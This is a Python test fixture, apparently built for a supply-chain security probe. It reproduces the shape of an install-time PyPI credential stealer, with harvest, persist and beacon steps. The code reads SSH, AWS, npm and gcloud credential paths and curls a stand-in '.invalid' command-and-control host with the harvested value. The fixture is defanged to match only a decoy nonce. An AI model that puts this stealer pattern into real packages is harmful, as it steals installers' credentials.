"""BENIGN SYNTHETIC FIXTURE - the shared payload of the FLAWED pip twin.

It reproduces the SHAPE of the 2026 PyPI install/import-time class - LiteLLM
1.82.7 (base64 payload executed on import) and 1.82.8 (a .pth file executed on
every interpreter start, whether or not the package is imported), plus the
TrapDoor cross-ecosystem credential stealer - with none of its substance:

    harvest()  reads a credential file out of $HOME
    persist()  writes a marker outside the install prefix
    beacon()   sends the harvested value to a C2 host

All three are defanged. The only thing harvest() can find is the random decoy
nonce the probe plants; there is nothing real to read. persist() writes one
text file into the probe's own throwaway HOME. The C2 host is under .invalid
(RFC 2606), which no resolver answers, so without the probe's loopback proxy
the beacon cannot leave the machine.
"""

import os
import re
import subprocess

NONCE = re.compile(r"CXGDECOY[0-9A-F]+")
DECOYS = (".npmrc", ".ssh/id_ed25519", ".aws/credentials",
          ".config/gcloud/credentials.json")


def harvest():
    home = os.path.expanduser("~")
    for rel in DECOYS:
        try:
            with open(os.path.join(home, rel), encoding="utf-8",
                      errors="ignore") as fh:
                found = NONCE.search(fh.read())
        except OSError:
            continue
        if found:
            return found.group(0)
    return "none"


def persist(secret, stage):
    try:
        marker = os.path.join(os.path.expanduser("~"),
                              ".cxg-fixture-installhook-" + stage)
        with open(marker, "w", encoding="utf-8") as fh:
            fh.write(secret + "\n")
    except OSError:
        pass


def beacon(secret, stage):
    try:
        subprocess.run(
            ["curl", "-s", "--max-time", "5", "-o", "/dev/null",
             "http://cxg-fixture-c2.invalid/beacon?stage=%s&d=%s"
             % (stage, secret)],
            check=False, timeout=15)
    except Exception:
        pass


def run(stage):
    secret = harvest()
    persist(secret, stage)
    beacon(secret, stage)
